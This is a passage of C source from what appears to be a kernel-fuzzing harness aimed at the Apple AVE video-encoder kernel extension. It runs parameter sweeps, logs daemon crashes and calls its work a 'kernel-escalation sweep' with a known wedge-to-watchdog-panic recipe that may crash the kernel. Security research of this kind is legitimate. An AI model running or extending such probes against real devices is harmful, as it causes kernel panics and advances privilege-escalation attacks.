            dprintf(STDOUT_FILENO, "%s  I[%s] %s sess%dx%d mapSz%ld fill=0x%04x xK=%d es=%d cb+%lu ok+%lu B+%lu (ref:%s) H=%016llx err=%d t=%.0fms VERDICT=%s\n",
                    pfx, tag, st, sw, sh, sz, fill, xKey, es, df, dO, dB, c0s, (unsigned long long)g_ave_cb_hash, (int)g_ave_cb_err, tMs, vd);
            if (strcmp(vd, "KILLED") == 0) {
                dprintf(STDOUT_FILENO, "%s  I[%s] %s: DAEMON DIED on this shot (es=%d) - .ips is the receipt; 12s respawn wait\n", pfx, tag, jid, es);
                usleep(12000000);  /* v127: 12s respawn wait - launchd throttleTimeout=10; 8s was too short (T1 blocked 111s) */
                nNoCbRun = 0;
            }
            if (strcmp(vd, "NO-CB") == 0) {
                if (++nNoCbRun >= 2) {   /* v115-r: two silent shots in a row = conn suspect - stop */
                    g_opt_conn_poisoned = 1;
                    dprintf(STDOUT_FILENO, "%s  I[%s] 2x NO-CB = CONN SUSPECT - sweep stops\n", pfx, tag);
                }
            } else {
                nNoCbRun = 0;
            }
        }
        if (g_opt_conn_poisoned) break;
        usleep(80000);   /* let the daemon settle between sessions */
    }
    dprintf(STDOUT_FILENO, "%s  I[%s] v142 26.6-QPMAP done: %d shot(s) ACCEPT=%d EFFECT=%d DROP=%d REJECT=%d NO-CB=%d KILLED=%d fault=%d TIMEOUT=%d C0B=%lu FAMB=%lu C0H=%016llx\n",
                    pfx, tag, nShot, nAcc, nEffect, nDrop, nRej, nNoCb, nKill, nFault, nTimeout, bC0, bFam, c0h);
}

/* ======================================================================
 * v143 ROW C - AVE KERNEL (the kernel-escalation sweep)
 * Everything aimed at the kext/firmware: the MCTF-ARMED INTMAX trio (the
 * v142 spec cells did NOT deliver unarmed - the MCTF fields only print/
 * consume when EnableMCTF=true arms the path), the QP-map kernel hunt
 * (byte1 axis + SliceQP+map compound + the 4K MB-surface size trio), and
 * the v84 HEVC UPS count-21 WEDGE recipe LAST (the proven USL-wedge ->
 * FrameReceiver-timeout -> watchdog-PANIC chain). MAY CRASH KERNEL/PANIC.
 * ====================================================================== */
void  probe_ave_opts(const char *pfx)
{
    dprintf(STDOUT_FILENO, "%s== C. AVE KERNEL (v145 - the QP-map regression core) ==\n", pfx);
    dprintf(STDOUT_FILENO, "%s  the QP-map regression core (M3/W6/B180/K4c/K4W). The MCTF front is CLOSED\n", pfx);
    dprintf(STDOUT_FILENO, "%s  (ImgBuf-verify pre-kernel gate); the value axis saturates at every surface.\n", pfx);
    ds_opt_row(pfx, "OP01 control", DS_OPT_NONE, 0, 0);
    /* v145: the MCTF-ARM trio is CUT - the 23:30 kernel log proved the armed
     * sessions NEVER reach the kext (all 14 kext sessions = AVC; OP02-04 die
     * daemon-side at AVE_ImgBuf_Verify -17691 = the same pre-kernel gate v80-v83
     * hit on 27b1). The MCTF front is CLOSED on 26.6. */
    ds_opt_qpmap_sweep(pfx, "OPC5 v145 KERNEL-HUNT");
    for (int oph = 1; oph <= 2; oph++) {
        char htag[16];
        snprintf(htag, sizeof(htag), "OPH%02d beat", oph);
        ds_ave_replay(pfx, htag, 1, 1, 64, kCMVideoCodecType_H264, kCVPixelFormatType_32BGRA, 1, 1);
        usleep(500000);
    }
    dprintf(STDOUT_FILENO, "%s  C read-offs: this row is now the REGRESSION CORE - M3 +455 / W6 1022 / B180\n", pfx);
    dprintf(STDOUT_FILENO, "%s  1018 / K4c 4053 / K4W 4042 are the pinned 26.6 classes; any drift = the\n", pfx);
    dprintf(STDOUT_FILENO, "%s  firmware changed. The MCTF front is CLOSED (ImgBuf-verify pre-kernel gate,\n", pfx);
    dprintf(STDOUT_FILENO, "%s  the 23:30 kernel log: zero MCTF sessions reached the kext). KERNEL log = oracle.\n", pfx);
}

